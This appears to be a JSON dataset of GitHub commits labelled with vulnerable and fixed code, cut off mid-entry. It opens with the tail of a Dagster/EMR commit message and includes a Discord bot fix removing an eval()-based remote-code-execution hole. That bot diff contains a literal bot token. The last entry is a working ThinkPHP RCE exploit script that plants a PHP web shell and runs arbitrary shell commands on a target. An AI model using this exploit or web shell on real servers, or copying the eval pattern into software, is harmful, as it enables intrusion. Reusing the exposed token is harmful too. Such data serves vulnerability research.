healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349"}},"https:\/\/github.com\/Deniz1433\/discord.py-bot":{"3df372c950a5807eefd2534a8fccd06b2ae88471":{"url":"https:\/\/api.github.com\/repos\/Deniz1433\/discord.py-bot\/commits\/3df372c950a5807eefd2534a8fccd06b2ae88471","html_url":"https:\/\/github.com\/Deniz1433\/discord.py-bot\/commit\/3df372c950a5807eefd2534a8fccd06b2ae88471","message":"Update main.py\n\nFixed remote code execution vulnerability on the \/math command","sha":"3df372c950a5807eefd2534a8fccd06b2ae88471","keyword":"remote code execution vulnerable","diff":"diff --git a\/main.py b\/main.py\nindex ec4b7bc..d818a24 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -5,7 +5,9 @@\n import requests\r\n import random\r\n import json\r\n-\r\n+import re\r\n+import os\r\n+import sympy\r\n \r\n class aclient(discord.Client):\r\n     def __init__(self):\r\n@@ -29,9 +31,14 @@ async def greet(interaction: discord.Interaction):\n \r\n \r\n @tree.command(name = \"math\", description = \"Evaluates a mathematical expression.\")\r\n-async def math(interaction: discord.Interaction, expression: str):\r\n-    result = eval(expression)\r\n-    await interaction.response.send_message(f\"The answer is {result}.\")\r\n+async def math(interaction: discord.Interaction, expression: str, precision: int = 2):\r\n+    try:\r\n+        result = sympy.sympify(expression).evalf(precision)\r\n+    except sympy.SympifyError:\r\n+        await interaction.response.send_message(\"Invalid expression.\")\r\n+        return\r\n+    re.sub(\"^(\\-?)0\\.\", r'\\1.', \"%.4f\" % result)\r\n+    await interaction.response.send_message(f\"The answer is {result}\")\r\n \r\n \r\n @tree.command(name = \"roll\", description = \"Simulates rolling dice e.g 2d6 to roll 2 dice.\")\r\n@@ -201,5 +208,11 @@ async def on_message(interaction: discord.Interaction):\n     # Send the corresponding answer to the Discord channel\r\n     await interaction.channel.send(commands[interaction.content])\r\n \r\n-\r\n-client.run(\"TOKEN\")\r\n+try:\r\n+    client.run('TOKEN')\r\n+except discord.errors.HTTPException:\r\n+    print(\"\\n\\n\\nBLOCKED BY RATE LIMITS\\nRESTARTING NOW\\n\\n\\n\")\r\n+    system(\"python restarter.py\")\r\n+    system('kill 1')\r\n+#Keep bot always online on replit  \r\n+#client.run(\"MTA1MDg2MTM3MjQ0OTIzOTA4MA.GTF4kQ.8f1Mhi0Jq1Ga3baze7hZwSNLNe_mijGKkJR3gQ\")\r\n","files":{"\/main.py":{"changes":[{"diff":"\n import requests\r\n import random\r\n import json\r\n-\r\n+import re\r\n+import os\r\n+import sympy\r\n \r\n class aclient(discord.Client):\r\n     def __init__(self):\r\n","add":3,"remove":1,"filename":"\/main.py","badparts":["\r"],"goodparts":["import re\r","import sympy\r"]},{"diff":"\n \r\n \r\n @tree.command(name = \"math\", description = \"Evaluates a mathematical expression.\")\r\n-async def math(interaction: discord.Interaction, expression: str):\r\n-    result = eval(expression)\r\n-    await interaction.response.send_message(f\"The answer is {result}.\")\r\n+async def math(interaction: discord.Interaction, expression: str, precision: int = 2):\r\n+    try:\r\n+        result = sympy.sympify(expression).evalf(precision)\r\n+    except sympy.SympifyError:\r\n+        await interaction.response.send_message(\"Invalid expression.\")\r\n+        return\r\n+    re.sub(\"^(\\-?)0\\.\", r'\\1.', \"%.4f\" % result)\r\n+    await interaction.response.send_message(f\"The answer is {result}\")\r\n \r\n \r\n @tree.command(name = \"roll\", description = \"Simulates rolling dice e.g 2d6 to roll 2 dice.\")\r\n","add":8,"remove":3,"filename":"\/main.py","badparts":["async def math(interaction: discord.Interaction, expression: str):\r","    result = eval(expression)\r","    await interaction.response.send_message(f\"The answer is {result}.\")\r"],"goodparts":["async def math(interaction: discord.Interaction, expression: str, precision: int = 2):\r","    try:\r","        result = sympy.sympify(expression).evalf(precision)\r","    except sympy.SympifyError:\r","        await interaction.response.send_message(\"Invalid expression.\")\r","        return\r","    re.sub(\"^(\\-?)0\\.\", r'\\1.', \"%.4f\" % result)\r","    await interaction.response.send_message(f\"The answer is {result}\")\r"]},{"diff":"\n     # Send the corresponding answer to the Discord channel\r\n     await interaction.channel.send(commands[interaction.content])\r\n \r\n-\r\n-client.run(\"TOKEN\")\r\n+try:\r\n+    client.run('TOKEN')\r\n+except discord.errors.HTTPException:\r\n+    print(\"\\n\\n\\nBLOCKED BY RATE LIMITS\\nRESTARTING NOW\\n\\n\\n\")\r\n+    system(\"python restarter.py\")\r\n+    system('kill 1')\r\n+#Keep bot always online on replit  \r\n+#client.run(\"MTA1MDg2MTM3MjQ0OTIzOTA4MA.GTF4kQ.8f1Mhi0Jq1Ga3baze7hZwSNLNe_mijGKkJR3gQ\")\r\n","add":8,"remove":2,"filename":"\/main.py","badparts":["\r","client.run(\"TOKEN\")\r"],"goodparts":["try:\r","    client.run('TOKEN')\r","except discord.errors.HTTPException:\r","    print(\"\\n\\n\\nBLOCKED BY RATE LIMITS\\nRESTARTING NOW\\n\\n\\n\")\r","    system(\"python restarter.py\")\r","    system('kill 1')\r"]},{"diff":"\n import requests\r\n import random\r\n import json\r\n-\r\n+import re\r\n+import os\r\n+import sympy\r\n \r\n class aclient(discord.Client):\r\n     def __init__(self):\r\n","add":3,"remove":1,"filename":"\/main.py","badparts":["\r"],"goodparts":["import re\r","import sympy\r"]},{"diff":"\n \r\n \r\n @tree.command(name = \"math\", description = \"Evaluates a mathematical expression.\")\r\n-async def math(interaction: discord.Interaction, expression: str):\r\n-    result = eval(expression)\r\n-    await interaction.response.send_message(f\"The answer is {result}.\")\r\n+async def math(interaction: discord.Interaction, expression: str, precision: int = 2):\r\n+    try:\r\n+        result = sympy.sympify(expression).evalf(precision)\r\n+    except sympy.SympifyError:\r\n+        await interaction.response.send_message(\"Invalid expression.\")\r\n+        return\r\n+    re.sub(\"^(\\-?)0\\.\", r'\\1.', \"%.4f\" % result)\r\n+    await interaction.response.send_message(f\"The answer is {result}\")\r\n \r\n \r\n @tree.command(name = \"roll\", description = \"Simulates rolling dice e.g 2d6 to roll 2 dice.\")\r\n","add":8,"remove":3,"filename":"\/main.py","badparts":["async def math(interaction: discord.Interaction, expression: str):\r","    result = eval(expression)\r","    await interaction.response.send_message(f\"The answer is {result}.\")\r"],"goodparts":["async def math(interaction: discord.Interaction, expression: str, precision: int = 2):\r","    try:\r","        result = sympy.sympify(expression).evalf(precision)\r","    except sympy.SympifyError:\r","        await interaction.response.send_message(\"Invalid expression.\")\r","        return\r","    re.sub(\"^(\\-?)0\\.\", r'\\1.', \"%.4f\" % result)\r","    await interaction.response.send_message(f\"The answer is {result}\")\r"]},{"diff":"\n     # Send the corresponding answer to the Discord channel\r\n     await interaction.channel.send(commands[interaction.content])\r\n \r\n-\r\n-client.run(\"TOKEN\")\r\n+try:\r\n+    client.run('TOKEN')\r\n+except discord.errors.HTTPException:\r\n+    print(\"\\n\\n\\nBLOCKED BY RATE LIMITS\\nRESTARTING NOW\\n\\n\\n\")\r\n+    system(\"python restarter.py\")\r\n+    system('kill 1')\r\n+#Keep bot always online on replit  \r\n+#client.run(\"MTA1MDg2MTM3MjQ0OTIzOTA4MA.GTF4kQ.8f1Mhi0Jq1Ga3baze7hZwSNLNe_mijGKkJR3gQ\")\r\n","add":8,"remove":2,"filename":"\/main.py","badparts":["\r","client.run(\"TOKEN\")\r"],"goodparts":["try:\r","    client.run('TOKEN')\r","except discord.errors.HTTPException:\r","    print(\"\\n\\n\\nBLOCKED BY RATE LIMITS\\nRESTARTING NOW\\n\\n\\n\")\r","    system(\"python restarter.py\")\r","    system('kill 1')\r"]}],"source":"\nimport asyncio\r import discord\r from discord import app_commands, Intents, Client, Interaction\r from discord.ext import commands\r import requests\r import random\r import json\r \r \r class aclient(discord.Client):\r def __init__(self):\r super().__init__(intents=discord.Intents.all())\r self.synced=False\r \r async def on_ready(self):\r await self.wait_until_ready()\r if not self.synced:\r await tree.sync()\r self.synced=True\r print(f\"Logged in as{self.user}.\")\r \r client=aclient()\r tree=app_commands.CommandTree(client)\r \r \r @tree.command(name=\"greet\", description=\"Sends a greeting message.\")\r async def greet(interaction: discord.Interaction):\r await interaction.response.send_message(\"Hello there!\")\r \r \r @tree.command(name=\"math\", description=\"Evaluates a mathematical expression.\")\r async def math(interaction: discord.Interaction, expression: str):\r result=eval(expression)\r await interaction.response.send_message(f\"The answer is{result}.\")\r \r \r @tree.command(name=\"roll\", description=\"Simulates rolling dice e.g 2d6 to roll 2 dice.\")\r async def roll(interaction: discord.Interaction, dice: str):\r rolls=dice.split(\"d\")\r total=0\r for i in range(0, int(rolls[0])):\r total +=random.randint(1, int(rolls[1]))\r await interaction.response.send_message(f\"You rolled a total of{total}.\")\r \r \r @tree.command(name=\"dolar\", description=\"Fetches the current exchange rate of US dollars to Turkish lira.\")\r async def dolar(interaction: discord.Interaction):\r api_key=\"TOKEN\"\r url=\"https:\/\/api.apilayer.com\/fixer\/latest\"\r headers={\"apikey\": api_key}\r params={\"base\": \"USD\", \"symbols\": \"USD,TRY\"}\r response=requests.get(url, headers=headers, params=params)\r data=response.json()\r print(f\"1 USD={data['rates']['TRY']} TRY\")\r try:\r await interaction.response.send_message(f\"1 USD={data['rates']['TRY']} TRY\")\r except KeyError:\r await interaction.response.send_message(\"Sorry, I could not fetch the current exchange rate.\")\r \r \r @tree.command(name=\"euro\", description=\"Fetches the current exchange rate of euros to Turkish lira.\")\r async def euro(interaction: discord.Interaction):\r api_key=\"TOKEN\"\r url=\"https:\/\/api.apilayer.com\/fixer\/latest\"\r headers={\"apikey\": api_key}\r params={\"base\": \"EUR\", \"symbols\": \"EUR,TRY\"}\r response=requests.get(url, headers=headers, params=params)\r data=response.json()\r print(f\"1 EUR={data['rates']['TRY']} TRY\")\r try:\r await interaction.response.send_message(f\"1 EUR={data['rates']['TRY']} TRY\")\r except KeyError:\r await interaction.response.send_message(\"Sorry, I could not fetch the current exchange rate.\")\r \r \r @tree.command(name=\"oyun\", description=\"Sends a message.\")\r async def oyun(interaction: discord.Interaction):\r await interaction.response.send_message(\"beni rahat b\u0131rak\u0131n\")\r \r \r @tree.command(name=\"say\", description=\"Makes the bot say a message.\")\r async def say(interaction: discord.Interaction, *, message: str):\r await interaction.response.send_message(\"Sent\", ephemeral=True)\r await interaction.channel.send(message)\r \r \r @tree.command(name=\"joke\", description=\"Fetches a random joke from the icanhazdadjoke API and sends it to the channel.\")\r async def joke(interaction: discord.Interaction):\r response=requests.get(\"https:\/\/icanhazdadjoke.com\/\",\r headers={\r \"Accept\": \"text\/plain\",\r \"Content-Type\": \"text\/plain; charset=utf-8\"\r })\r \r joke=response.text.replace(\"\u00e2\u0080\u0099\", \"\\u2019\")\r \r await interaction.response.send_message(joke)\r \r \r @tree.command(name=\"quote\", description=\"Fetches a random quote from the Forismatic API and sends it to the channel.\")\r async def quote(interaction: discord.Interaction):\r response=requests.get(\"http:\/\/api.forismatic.com\/api\/1.0\/\",\r params={\r \"method\": \"getQuote\",\r \"format\": \"text\",\r \"lang\": \"en\"\r })\r \r await interaction.response.send_message(response.text)\r \r \r @tree.command(name=\"avatar\", description=\"Sends the avatar of a specified member to the channel.\")\r async def avatar(interaction: discord.Interaction, member: discord.Member, use_server_avatar: str=\"default\"):\r if use_server_avatar.lower()==\"server\" or use_server_avatar.lower()==\"true\" or use_server_avatar.lower()==\"yes\":\r await interaction.response.send_message(member.display_avatar)\r else:\r await interaction.response.send_message(member.avatar)\r \r \r @tree.command(name=\"sspam\", description=\"Sends a spam message.\")\r async def sspam(interaction: discord.Interaction):\r await interaction.response.send_message(\r \"s\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ns\"\r )\r \r \r commands={}\r \r @tree.command(name=\"addcommand\", description=\"Adds a custom command to the bot.\")\r async def addcommand(interaction: discord.Interaction, message: str, answer: str):\r if interaction.channel.permissions_for(interaction.user).manage_messages:\r if interaction.channel.permissions_for(interaction.guild.me).manage_messages:\r commands[message]=answer\r commands_json=json.dumps(commands)\r with open(\"commands.txt\", \"w\") as f:\r f.write(commands_json)\r await interaction.response.send_message(f\"Command '{message}' added successfully!\")\r else:\r await interaction.response.send_message(\"You do not have the necessary permissions to add commands.\")\r \r with open(\"commands.txt\", \"r\") as f:\r commands_json=f.read()\r commands=json.loads(commands_json)\r \r \r @tree.command(name=\"removecommand\", description=\"Removes a command from the commands dictionary.\")\r async def removecommand(interaction: discord.Interaction, message: str):\r if interaction.channel.permissions_for(interaction.user).manage_messages:\r if interaction.channel.permissions_for(interaction.guild.me).manage_messages:\r if message in commands:\r del commands[message]\r commands_json=json.dumps(commands)\r with open(\"commands.txt\", \"w\") as f:\r f.write(commands_json)\r await interaction.response.send_message(f\"Command '{message}' removed successfully!\")\r else:\r await interaction.response.send_message(f\"Command '{message}' does not exist.\")\r else:\r await interaction.response.send_message(\"You do not have the necessary permissions to remove commands.\")\r \r \r @tree.command(name=\"listcommands\", description=\"Lists all custom commands.\")\r async def listcommands(interaction: discord.Interaction):\r command_list=\"\\n\".join([f\"{message}:{answer}\" for message, answer in commands.items()])\r output=f\"Commands:\\n```\\n{command_list}\\n```\"\r await interaction.response.send_message(output)\r \r \r @tree.client.event\r async def on_message(interaction: discord.Interaction):\r if interaction.author==client.user:\r return\r \r if interaction.content in commands:\r await interaction.channel.send(commands[interaction.content])\r \r \r client.run(\"TOKEN\")\r ","sourceWithComments":"import asyncio\r\nimport discord\r\nfrom discord import app_commands, Intents, Client, Interaction\r\nfrom discord.ext import commands\r\nimport requests\r\nimport random\r\nimport json\r\n\r\n\r\nclass aclient(discord.Client):\r\n    def __init__(self):\r\n        super().__init__(intents=discord.Intents.all())\r\n        self.synced = False\r\n\r\n    async def on_ready(self):\r\n        await self.wait_until_ready()\r\n        if not self.synced:\r\n            await tree.sync()\r\n            self.synced = True\r\n        print(f\"Logged in as {self.user}.\")\r\n\r\nclient = aclient()\r\ntree = app_commands.CommandTree(client)\r\n\r\n\r\n@tree.command(name = \"greet\", description = \"Sends a greeting message.\")\r\nasync def greet(interaction: discord.Interaction):\r\n    await interaction.response.send_message(\"Hello there!\")\r\n\r\n\r\n@tree.command(name = \"math\", description = \"Evaluates a mathematical expression.\")\r\nasync def math(interaction: discord.Interaction, expression: str):\r\n    result = eval(expression)\r\n    await interaction.response.send_message(f\"The answer is {result}.\")\r\n\r\n\r\n@tree.command(name = \"roll\", description = \"Simulates rolling dice e.g 2d6 to roll 2 dice.\")\r\nasync def roll(interaction: discord.Interaction, dice: str):\r\n    rolls = dice.split(\"d\")\r\n    total = 0\r\n    for i in range(0, int(rolls[0])):\r\n        total += random.randint(1, int(rolls[1]))\r\n    await interaction.response.send_message(f\"You rolled a total of {total}.\")\r\n\r\n\r\n@tree.command(name = \"dolar\", description = \"Fetches the current exchange rate of US dollars to Turkish lira.\")\r\nasync def dolar(interaction: discord.Interaction):\r\n    api_key = \"TOKEN\"\r\n    url = \"https:\/\/api.apilayer.com\/fixer\/latest\"\r\n    headers = {\"apikey\": api_key}\r\n    params = {\"base\": \"USD\", \"symbols\": \"USD,TRY\"}\r\n    response = requests.get(url, headers=headers, params=params)\r\n    data = response.json()\r\n    print(f\"1 USD = {data['rates']['TRY']} TRY\")\r\n    try:\r\n        # Print the exchange rate of USD to TRY\r\n        await interaction.response.send_message(f\"1 USD = {data['rates']['TRY']} TRY\")\r\n    except KeyError:\r\n        #Print a message if the 'rates' or 'TRY' keys are not found in the response data\r\n        await interaction.response.send_message(\"Sorry, I could not fetch the current exchange rate.\")\r\n\r\n\r\n@tree.command(name = \"euro\", description = \"Fetches the current exchange rate of euros to Turkish lira.\")\r\nasync def euro(interaction: discord.Interaction):\r\n    api_key = \"TOKEN\"\r\n    url = \"https:\/\/api.apilayer.com\/fixer\/latest\"\r\n    headers = {\"apikey\": api_key}\r\n    params = {\"base\": \"EUR\", \"symbols\": \"EUR,TRY\"}\r\n    response = requests.get(url, headers=headers, params=params)\r\n    data = response.json()\r\n    print(f\"1 EUR = {data['rates']['TRY']} TRY\")\r\n    try:\r\n        # Print the exchange rate of EUR to TRY\r\n        await interaction.response.send_message(f\"1 EUR = {data['rates']['TRY']} TRY\")\r\n    except KeyError:\r\n        #Print a message if the 'rates' or 'TRY' keys are not found in the response data\r\n        await interaction.response.send_message(\"Sorry, I could not fetch the current exchange rate.\")\r\n\r\n\r\n@tree.command(name = \"oyun\", description = \"Sends a message.\")\r\nasync def oyun(interaction: discord.Interaction):\r\n    await interaction.response.send_message(\"beni rahat b\u0131rak\u0131n\")\r\n\r\n\r\n@tree.command(name = \"say\", description = \"Makes the bot say a message.\")\r\nasync def say(interaction: discord.Interaction, *, message: str):\r\n  # Send the message\r\n  await interaction.response.send_message(\"Sent\", ephemeral=True)\r\n  await interaction.channel.send(message)\r\n\r\n\r\n@tree.command(name = \"joke\", description = \"Fetches a random joke from the icanhazdadjoke API and sends it to the channel.\")\r\nasync def joke(interaction: discord.Interaction):\r\n    # Fetch a random joke from the icanhazdadjoke API\r\n    response = requests.get(\"https:\/\/icanhazdadjoke.com\/\",\r\n                          headers={\r\n                                \"Accept\": \"text\/plain\",\r\n                                \"Content-Type\": \"text\/plain; charset=utf-8\"\r\n                          })\r\n\r\n    # Replace the special characters with their Unicode escape sequences\r\n    joke = response.text.replace(\"\u00e2\u0080\u0099\", \"\\u2019\")\r\n\r\n    # Send the joke to the channel\r\n    await interaction.response.send_message(joke)\r\n\r\n\r\n@tree.command(name = \"quote\", description = \"Fetches a random quote from the Forismatic API and sends it to the channel.\")\r\nasync def quote(interaction: discord.Interaction):\r\n    # Fetch a random quote from the Forismatic API\r\n    response = requests.get(\"http:\/\/api.forismatic.com\/api\/1.0\/\",\r\n                          params={\r\n                                \"method\": \"getQuote\",\r\n                                \"format\": \"text\",\r\n                                \"lang\": \"en\"\r\n                          })\r\n\r\n    # Send the quote to the channel\r\n    await interaction.response.send_message(response.text)\r\n\r\n\r\n@tree.command(name = \"avatar\", description = \"Sends the avatar of a specified member to the channel.\")\r\nasync def avatar(interaction: discord.Interaction, member: discord.Member, use_server_avatar: str = \"default\"):\r\n    # Send the member's avatar to the channel\r\n    if use_server_avatar.lower() == \"server\" or use_server_avatar.lower() == \"true\" or use_server_avatar.lower() == \"yes\":\r\n        # Send the member's server-specific avatar if use_server_avatar is True\r\n        await interaction.response.send_message(member.display_avatar)\r\n    else:\r\n        # Send the member's default avatar if use_server_avatar is False\r\n        await interaction.response.send_message(member.avatar)\r\n\r\n\r\n@tree.command(name = \"sspam\", description = \"Sends a spam message.\")\r\nasync def sspam(interaction: discord.Interaction):\r\n    await interaction.response.send_message(\r\n        \"s\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ns\"\r\n    )\r\n\r\n\r\ncommands = {}\r\n\r\n@tree.command(name = \"addcommand\", description = \"Adds a custom command to the bot.\")\r\nasync def addcommand(interaction: discord.Interaction, message: str, answer: str):\r\n    # Check if the user has the necessary permissions\r\n    if interaction.channel.permissions_for(interaction.user).manage_messages:\r\n        # Check if the bot has the necessary permissions\r\n        if interaction.channel.permissions_for(interaction.guild.me).manage_messages:\r\n            # Add the message and answer pair to the commands dictionary\r\n            commands[message] = answer\r\n            # Serialize the commands dictionary to a JSON object\r\n            commands_json = json.dumps(commands)\r\n            # Write the JSON object to the commands.txt file\r\n            with open(\"commands.txt\", \"w\") as f:\r\n                f.write(commands_json)\r\n            await interaction.response.send_message(f\"Command '{message}' added successfully!\")\r\n    else:\r\n        await interaction.response.send_message(\"You do not have the necessary permissions to add commands.\")\r\n\r\nwith open(\"commands.txt\", \"r\") as f:\r\n  commands_json = f.read()\r\n  commands = json.loads(commands_json)\r\n\r\n\r\n@tree.command(name = \"removecommand\", description = \"Removes a command from the commands dictionary.\")\r\nasync def removecommand(interaction: discord.Interaction, message: str):\r\n  # Check if the user has the necessary permissions\r\n  if interaction.channel.permissions_for(interaction.user).manage_messages:\r\n    # Check if the bot has the necessary permissions\r\n    if interaction.channel.permissions_for(interaction.guild.me).manage_messages:\r\n      # Check if the message is a key in the commands dictionary\r\n      if message in commands:\r\n        # Remove the message-answer pair from the commands dictionary\r\n        del commands[message]\r\n        # Serialize the updated commands dictionary to a JSON object\r\n        commands_json = json.dumps(commands)\r\n        # Write the JSON object to the commands.txt file\r\n        with open(\"commands.txt\", \"w\") as f:\r\n          f.write(commands_json)\r\n        await interaction.response.send_message(f\"Command '{message}' removed successfully!\")\r\n      else:\r\n        await interaction.response.send_message(f\"Command '{message}' does not exist.\")\r\n  else:\r\n    await interaction.response.send_message(\"You do not have the necessary permissions to remove commands.\")\r\n  \r\n\r\n@tree.command(name = \"listcommands\", description = \"Lists all custom commands.\")\r\nasync def listcommands(interaction: discord.Interaction):\r\n  command_list = \"\\n\".join([f\"{message}: {answer}\" for message, answer in commands.items()])\r\n  output = f\"Commands:\\n```\\n{command_list}\\n```\"\r\n  await interaction.response.send_message(output)\r\n\r\n\r\n@tree.client.event\r\nasync def on_message(interaction: discord.Interaction):\r\n  # Check if the message was sent by the bot\r\n  if interaction.author == client.user:\r\n    return\r\n\r\n  # Check if the message is a command in the commands dictionary\r\n  if interaction.content in commands:\r\n    # Send the corresponding answer to the Discord channel\r\n    await interaction.channel.send(commands[interaction.content])\r\n\r\n\r\nclient.run(\"TOKEN\")\r\n"}},"msg":"Update main.py\n\nFixed remote code execution vulnerability on the \/math command"}},"https:\/\/github.com\/Mesfa\/poc":{"4746f726d402f4206d25aaaebd97c13be76991f8":{"url":"https:\/\/api.github.com\/repos\/Mesfa\/poc\/commits\/4746f726d402f4206d25aaaebd97c13be76991f8","html_url":"https:\/\/github.com\/Mesfa\/poc\/commit\/4746f726d402f4206d25aaaebd97c13be76991f8","message":"Thinkphp5 5.0.22\/5.1.29 Remote Code Execution Vulnerability","sha":"4746f726d402f4206d25aaaebd97c13be76991f8","keyword":"remote code execution vulnerable","diff":"diff --git a\/src\/request\/thinkphp5.0.20.py b\/src\/request\/thinkphp5.0.20.py\nindex 5081226..215ca65 100644\n--- a\/src\/request\/thinkphp5.0.20.py\n+++ b\/src\/request\/thinkphp5.0.20.py\n@@ -1,16 +1,45 @@\n #coding:utf-8\n import sys\n-import requests,re\n-#index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n+import requests\n def verify(target_url):\n     headers = {\n         'User_Agent':'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/104.0.0.0 Safari\/537.36'\n     }\n     resp = requests.get(target_url,headers=headers)\n-    with open(\"phpinfo.html\",'wb') as f:\n-        f.write(resp.content)\n+    if \"SERVER_ADDR\" in resp.content.decode():\n+        print(\"\u68c0\u6d4b\u5230\u6f0f\u6d1e\")\n+        with open(\"phpinfo.html\", 'wb') as f:\n+            f.write(resp.content)\n+def get_shell(url):\n+    taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=MS.php&vars[1][1]=<?php%20@eval($_POST[%27mesfa%27])?>'\n+    resp = requests.get(taget_url)\n+    if resp.status_code==200:\n+        print(\"[+]\"+url+\"\/MS.php   Pass:mesfa\")\n+def getcode_run(url,cmd):\n+    taget_url = url+ r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='+cmd\n+    resp = requests.get(taget_url)\n+    print(resp.text)\n+    # html = etree.HTML(resp.text)\n+    # print(html)\n+    # print(html.xpath('\/html\/body\/text()'))\n+def help():\n+    print('''\n+    #\u9a8c\u8bc1\u6f0f\u6d1e\n+    python3 thinkphp.py target_url verify\n+    #getshell\n+    python3 thinkphp.py target_url getshell\n+    #\u547d\u4ee4\u6267\u884c\n+    python3 thinphp.py target_url -c cmd \n+    ''')\n if __name__ == '__main__':\n     args = sys.argv\n     url = args[1]\n     taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'\n-    verify(taget_url)\n\\ No newline at end of file\n+    if args[2] == 'verify':\n+        verify(taget_url)\n+    if args[2] == 'getshell':\n+        get_shell(args[1])\n+    if args[2] =='-c':\n+        getcode_run(args[1],args[3])\n+    if args[2]=='-h':\n+        help()\n\\ No newline at end of file\n","files":{"\/src\/request\/thinkphp5.0.20.py":{"changes":[{"diff":"\n #coding:utf-8\n import sys\n-import requests,re\n-#index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n+import requests\n def verify(target_url):\n     headers = {\n         'User_Agent':'Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/104.0.0.0 Safari\/537.36'\n     }\n     resp = requests.get(target_url,headers=headers)\n-    with open(\"phpinfo.html\",'wb') as f:\n-        f.write(resp.content)\n+    if \"SERVER_ADDR\" in resp.content.decode():\n+        print(\"\u68c0\u6d4b\u5230\u6f0f\u6d1e\")\n+        with open(\"phpinfo.html\", 'wb') as f:\n+            f.write(resp.content)\n+def get_shell(url):\n+    taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=MS.php&vars[1][1]=<?php%20@eval($_POST[%27mesfa%27])?>'\n+    resp = requests.get(taget_url)\n+    if resp.status_code==200:\n+        print(\"[+]\"+url+\"\/MS.php   Pass:mesfa\")\n+def getcode_run(url,cmd):\n+    taget_url = url+ r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='+cmd\n+    resp = requests.get(taget_url)\n+    print(resp.text)\n+    # html = etree.HTML(resp.text)\n+    # print(html)\n+    # print(html.xpath('\/html\/body\/text()'))\n+def help():\n+    print('''\n+    #\u9a8c\u8bc1\u6f0f\u6d1e\n+    python3 thinkphp.py target_url verify\n+    #getshell\n+    python3 thinkphp.py target_url getshell\n+    #\u547d\u4ee4\u6267\u884c\n+    python3 thinphp.py target_url -c cmd \n+    ''')\n if __name__ == '__main__':\n     args = sys.argv\n     url = args[1]\n     taget_url = url+r'\/index.php?s=\/Index\/\\think\\app\/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'\n-    verify(taget_url)\n\\ No newline at end of file\n+    if args[2] == 'verify':\n+        verify(taget_url)\n+    if args[2] == 'getshell':\n+        get_shell(args[1])\n+    if args[2] =='-c':\n+        getcode_run(args[1],args[3])\n+    if args[2]=='-h':\n+        help()\n\\ No newline at end of file\n","add":34,"remove":5,"filename":"\/src\/request\/thinkphp5.0.20.py","badparts":["import requests,re","    with open(\"phpinfo.html\",'wb') as f:","        f.write(resp.content)","    verify(taget_url)"],"goodparts":["import requests","    if \"SERVER_ADDR\" in resp.content.decode():","        print(\"\u68c0\u6d4b\u5230\u6f0f\u6d1e\")","        with open(\"phpinfo.html\", 'wb') as f:","            f.write(resp.content)","def get_shell(url):","    taget_url = 